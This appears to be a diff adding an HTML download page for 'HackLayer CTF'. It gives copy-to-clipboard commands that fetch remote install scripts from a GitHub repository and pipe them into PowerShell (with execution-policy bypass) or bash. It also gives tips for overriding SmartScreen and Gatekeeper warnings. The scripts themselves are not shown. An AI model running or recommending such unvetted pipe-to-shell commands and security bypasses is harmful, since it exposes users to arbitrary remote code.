@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackLayer CTF — Download</title>
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0a0a;
+            color: #e8e8e8;
+            min-height: 100vh;
+            padding: 40px 20px
+        }
+
+        .wrap {
+            max-width: 640px;
+            margin: 0 auto
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 4px;
+            color: #fff
+        }
+
+        h1 span {
+            color: #00ff88
+        }
+
+        .sub {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 36px
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(0, 255, 136, .1);
+            border: 1px solid rgba(0, 255, 136, .3);
+            color: #00ff88;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 28px
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #1a1a1a;
+            margin: 32px 0
+        }
+
+        h2 {
+            font-size: 1rem;
+            color: #fff;
+            margin-bottom: 12px
+        }
+
+        h2 .emoji {
+            margin-right: 6px
+        }
+
+        .cmd-label {
+            font-size: 11px;
+            color: #666;
+            margin-bottom: 4px;
+            margin-top: 12px
+        }
+
+        .cmd-label:first-of-type {
+            margin-top: 0
+        }
+
+        .cmd {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 6px;
+            padding: 10px 12px;
+            font-family: 'SF Mono', 'Fira Code', Consolas, monospace;
+            font-size: 12px;
+            color: #00aaff;
+            overflow-x: auto;
+            white-space: nowrap;
+            cursor: pointer;
+            position: relative;
+            margin-bottom: 8px;
+            transition: border-color .2s
+        }
+
+        .cmd:hover {
+            border-color: #00aaff
+        }
+
+        .cmd::after {
+            content: 'copy';
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 9px;
+            color: #444;
+            font-family: -apple-system, sans-serif
+        }
+
+        .cmd:active::after {
+            content: 'copied!';
+            color: #00ff88
+        }
+
+        .or {
+            color: #444;
+            font-size: 11px;
+            margin: 6px 0 6px 0;
+            text-align: center
+        }
+
+        .dl-btn {
+            display: inline-block;
+            padding: 12px 28px;
+            background: #00ff88;
+            color: #000;
+            font-weight: 700;
+            font-size: 14px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-top: 12px;
+            transition: transform .15s
+        }
+
+        .dl-btn:hover {
+            transform: scale(1.03)
+        }
+
+        .note {
+            color: #555;
+            font-size: 11px;
+            margin-top: 8px;
+            line-height: 1.5
+        }
+
+        .note code {
+            background: #1a1a1a;
+            padding: 1px 5px;
+            border-radius: 3px;
+            color: #888;
+            font-size: 10px
+        }
+
+        .section {
+            margin-bottom: 0
+        }
+
+        .hash-box {
+            margin-top: 20px;
+            background: #0d0d0d;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 14px
+        }
+
+        .hash-box h3 {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 8px
+        }
+
+        .hash-val {
+            font-family: monospace;
+            font-size: 10px;
+            color: #00ff88;
+            word-break: break-all;
+            cursor: pointer;
+            padding: 6px 8px;
+            background: #111;
+            border-radius: 4px;
+            border: 1px solid #222
+        }
+
+        .hash-val:hover {
+            border-color: #00ff88
+        }
+
+        .verify {
+            font-size: 10px;
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.7
+        }
+
+        .verify code {
+            background: #111;
+            padding: 1px 4px;
+            border-radius: 3px;
+            color: #666
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 10px;
+            color: #333;
+            text-align: center
+        }
+
+        .footer a {
+            color: #444;
+            text-decoration: none
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: #00ff88;
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            opacity: 0;
+            transition: all .3s;
+            z-index: 99
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+        <h1><span>⚡</span> HackLayer CTF</h1>
+        <p class="sub">Secure Capture The Flag Environment</p>
+        <div class="badge">v<span id="ver">1.0.0</span></div>
+
+        <!-- WINDOWS -->
+        <div class="section">
+            <h2><span class="emoji">🖥️</span> Windows</h2>
+            <p class="cmd-label">PowerShell:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v="irm https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex">
+                irm https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex</div>
+            <p class="cmd-label">CMD:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v='powershell -ep Bypass -c "irm https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex"'>
+                powershell -ep Bypass -c "irm
+                https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex"</div>
+            <div class="or">— or download directly —</div>
+            <a class="dl-btn" id="dl-win" href="#">⬇ Download .exe</a>
+            <p class="note">If SmartScreen blocks → Right-click → Properties → <code>Unblock</code> → OK → Run</p>
+        </div>
+
+        <hr>
+
+        <!-- macOS -->
+        <div class="section">
+            <h2><span class="emoji">🍎</span> macOS</h2>
+            <p class="cmd-label">Terminal:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v="curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash">
+                curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
+            </div>
+            <p class="cmd-label">Or with wget:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v="wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash">
+                wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash</div>
+            <div class="or">— or download directly —</div>
+            <a class="dl-btn" id="dl-mac" href="#">⬇ Download .dmg</a>
+            <p class="note">If Gatekeeper blocks: Right-click → Open, or run
+                <code>xattr -cr ~/Downloads/HackLayer-CTF-*.dmg</code></p>
+        </div>
+
+        <hr>
+
+        <!-- Linux -->
+        <div class="section">
+            <h2><span class="emoji">🐧</span> Linux</h2>
+            <p class="cmd-label">Terminal:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v="curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash">
+                curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
+            </div>
+            <p class="cmd-label">Or with wget:</p>
+            <div class="cmd" onclick="copy(this)"
+                data-v="wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash">
+                wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash</div>
+            <div class="or">— or download directly —</div>
+            <a class="dl-btn" id="dl-linux" href="#">⬇ Download .AppImage</a>
+            <p class="note">Make executable: <code>chmod +x HackLayer-CTF-*.AppImage</code> then run</p>
+        </div>
+
+        <hr>
+
+        <!-- SHA256 -->
+        <div class="hash-box" id="hashBox" style="display:none">
+            <h3>🔐 SHA256 Checksum</h3>
+            <div class="hash-val" id="hashVal" onclick="copyHash()"></div>
+            <div class="verify">
+                Verify: <code>certutil -hashfile file.exe SHA256</code> (Win) · <code>shasum -a 256 file</code> (Mac) ·
+                <code>sha256sum file</code> (Linux)
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 <a href="https://hacklayer.com">HackLayer</a> · App auto-updates after first install</p>
+        </div>
+    </div>
+
+    <div class="toast" id="toast">Copied!</div>
+
+    <script>
+        const U = 'SankiiM', R = 'hacklayer-ctf-download';
+        let V = '1.0.0', CS = {};
+
+        (async () => {
+            try {
+                const r = await fetch(`https://api.github.com/repos/${U}/${R}/releases/latest`);
+                if (r.ok) {
+                    const d = await r.json();
+                    if (d.tag_name) V = d.tag_name.replace(/^v/, '');
+                    document.getElementById('ver').textContent = V;
+                    if (d.body) d.body.split('\n').forEach(l => { const m = l.match(/^([a-f0-9]{64})\s+(.+)$/i); if (m) CS[m[2].trim()] = m[1] });
+                    if (d.assets) {
+                        const ca = d.assets.find(a => a.name === 'SHA256SUMS.txt');
+                        if (ca) try { const t = await (await fetch(ca.browser_download_url)).text(); t.split('\n').forEach(l => { const m = l.match(/^([a-f0-9]{64})\s+(.+)$/i); if (m) CS[m[2].trim()] = m[1] }) } catch (e) { }
+                    }
+                } else {
+                    try { const rr = await fetch(`https://github.com/${U}/${R}/releases/latest`, { redirect: 'manual' }); const loc = rr.headers.get('location') || ''; const m = loc.match(/\/tag\/v?(.+)$/); if (m) { V = m[1]; document.getElementById('ver').textContent = V } } catch (e) { }
+                }
+            } catch (e) { }
+            // Set download links
+            document.getElementById('dl-win').href = `https://github.com/${U}/${R}/releases/download/v${V}/HackLayer-CTF-Setup-${V}.exe`;
+            document.getElementById('dl-mac').href = `https://github.com/${U}/${R}/releases/download/v${V}/HackLayer-CTF-${V}-arm64.dmg`;
+            document.getElementById('dl-linux').href = `https://github.com/${U}/${R}/releases/download/v${V}/HackLayer-CTF-${V}.AppImage`;
+            // Show checksum if available
+            const winHash = CS[`HackLayer-CTF-Setup-${V}.exe`];
+            if (winHash) { document.getElementById('hashBox').style.display = 'block'; document.getElementById('hashVal').textContent = winHash }
+        })();
+
+        function copy(el) { navigator.clipboard.writeText(el.getAttribute('data-v')); toast() }
+        function copyHash() { navigator.clipboard.writeText(document.getElementById('hashVal').textContent); toast() }
+        function toast() { const t = document.getElementById('toast'); t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 1500) }
+    </script>
+</body>
+
+</html>
